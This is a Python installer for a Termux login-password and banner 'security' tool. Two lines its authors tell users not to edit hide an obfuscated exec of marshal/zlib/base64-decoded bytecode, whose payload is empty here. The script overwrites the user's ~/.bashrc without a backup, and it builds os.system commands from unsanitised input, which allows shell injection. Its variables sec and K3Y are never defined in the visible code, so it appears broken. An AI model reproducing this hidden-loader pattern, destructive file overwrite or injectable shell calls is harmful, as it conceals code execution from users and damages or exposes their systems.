#Coded By Dark Slad3
#A Product Of ToxicNoob
#If You Want To Get Knowledge From This  Source Code, You're Welcomed....
#But If You Want To Copy And Take Cradits, Then Get Out...

import os
import sys
import time

def psb(z):
    for e in z + '\n':
        sys.stdout.write(e)
        sys.stdout.flush()
        time.sleep(0.03)

security = "python .Sec.py"
banner = "lolcat .banner.txt"
bansec = "python .Sec.py && lolcat .banner.txt"

#Don't Delete Or Edit This Line
exec(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 39, 109, 97, 114, 115, 104, 97, 108, 39, 41, 46, 108, 111, 97, 100, 115],chr))(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 122, 108, 105, 98, 34, 41, 46, 100, 101, 99, 111, 109, 112, 114, 101, 115, 115],chr))(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 98, 97, 115, 101, 54, 52, 34, 41, 46, 98, 54, 52, 100, 101, 99, 111, 100, 101],chr))(b''))))

if(sec==K3Y):
	print("\n")
	print("[*] Access Approved....")
	time.sleep(0.6)
	psb("\n[!] Loading...")
	time.sleep(0.8)
	psb("\n[!] Please Wait.....")
	time.sleep(1)

	print("\033[92m")
	os.system("clear")
	os.system("figlet TSecurity")
	print("  TOOLS CREAT BY DEVIL TERMUX WORLD \033[0;92m")
	print
	print("\033[1;94m────────────────────────────────────────────\x1b[1;94m")
	print ("\033[1;92m▸ \033[92mAuthor   : MrDevilEx")
	print ("\033[1;92m▸ \033[92mGithub   : https://github.com/MrDevilEx")
	print("\033[1;94m────────────────────────────────────────────")
	time.sleep(0.3)
	print
	time.sleep(1)
	print("\033[92m")
	print("\n[01] Install Security Only.")
	print("[02] Install Banner Only.")
	print("[03] Install Security with Banner.\n")
	time.sleep(0.6)

	op = input("[*] Enter Your Choice:> 0")
	print("\n")

	if(op=="1"):
	 time.sleep(1)
	 UserName = input("[*] Enter Username You Want To Use:> ")
	 print
	 PassWord = input("[*] Enter Password You Want To Use:> ")
	 psb("\n[!] Please Wait.....")
	 file1 = open(".Don’tDeleteThisFile.py", "r")
	 file2 = open("temp.py", "w")
	 for line in file1:
	 	file2.write(line.replace("UniqU", "\""+UserName+"\""))
	 file1.close()
	 file2.close()
	 file1 = open("temp.py", "r")
	 file2 = open(".Sec.py", "w")
	 for line in file1:
 		file2.write(line.replace("UniqP", "\""+PassWord+"\""))
	 file1.close()
	 file2.close()
	 os.system("rm temp.py")
	 os.system("cp .Sec.py ~")
	 os.system("rm .Sec.py")
	 file = open("/data/data/com.termux/files/home/.bashrc", "w")
	 file.write(security)
	 file.close()
	 os.system("touch $HOME/.hushlogin")
	 time.sleep(1)
	 psb("\n[*] Successfully Installed Security In Termux....")
	 time.sleep(0.6)
	 psb("\n[*] Please Restart Your Termux and Enjoy.....\n\033[37;40m")
	 time.sleep(1)

	elif(op=="2"):
	 name = input("[*] Enter Name For Banner:> ")
	 time.sleep(1)
	 psb("\n[!] Please Wait....")
	 os.system("figlet "+name+" > .banner.txt")
	 os.system("mv .banner.txt ~")
	 file = open("/data/data/com.termux/files/home/.bashrc", "w")
	 file.write(banner)
	 file.close()
	 os.system("touch $HOME/.hushlogin")
	 time.sleep(1)
	 psb("\n[*] Successfully Installed Banner In Termux...")
	 time.sleep(0.6)
	 psb("\n[*] Please Restart Your Termux and Enjoy.....\n\033[37;40m")
	 time.sleep(1)

	elif(op=="3"):
	 name = input("[*] Enter Name For Banner:> ")
	 time.sleep(1)
	 print(" \n")
	 UserName = input("[*] Enter Username You Want To Use:> ")
	 print
	 PassWord = input("[*] Enter Password You Want To Use:> ")
	 psb("\n[!] Please Wait.....")
	 time.sleep(0.7)
	 file1 = open(".Don’tDeleteThisFile.py", "r")
	 file2 = open("temp.py", "w")
	 for line in file1:
	  	file2.write(line.replace("UniqU", "\""+UserName+"\""))
	 file1.close()
	 file2.close()
	 file1 = open("temp.py", "r")
	 file2 = open(".Sec.py", "w")
	 for line in file1:
	 	file2.write(line.replace("UniqP", "\""+PassWord+"\""))
	 file1.close()
	 file2.close()
	 os.system("rm temp.py")
	 os.system("cp .Sec.py ~")
	 os.system("rm .Sec.py")
	 os.system("figlet "+name+" > .banner.txt")
	 os.system("mv .banner.txt ~")
	 file = open("/data/data/com.termux/files/home/.bashrc", "w")
	 file.write(bansec)
	 file.close()
	 os.system("touch $HOME/.hushlogin")
	 time.sleep(1)
	 psb("\n[*] Successfully Installed Security and Banner In Termux....")
	 time.sleep(0.6)
	 psb("\n[*] Please Restart Your Termux and Enjoy.....\n\033[37;40m")
	 time.sleep(1)
	

	else:
	 print("\033[31m[!] Please Make a Correct Choice...")
	 time.sleep(1)
	 os.system("python setup.py")

else:
#Don'T Delete Or Edit This Line
	exec(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 39, 109, 97, 114, 115, 104, 97, 108, 39, 41, 46, 108, 111, 97, 100, 115],chr))(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 122, 108, 105, 98, 34, 41, 46, 100, 101, 99, 111, 109, 112, 114, 101, 115, 115],chr))(eval((lambda ____,__,_ : ____.join([_(___) for ___ in __]))('',[95, 95, 105, 109, 112, 111, 114, 116, 95, 95, 40, 34, 98, 97, 115, 101, 54, 52, 34, 41, 46, 98, 54, 52, 100, 101, 99, 111, 100, 101],chr))(b''))))

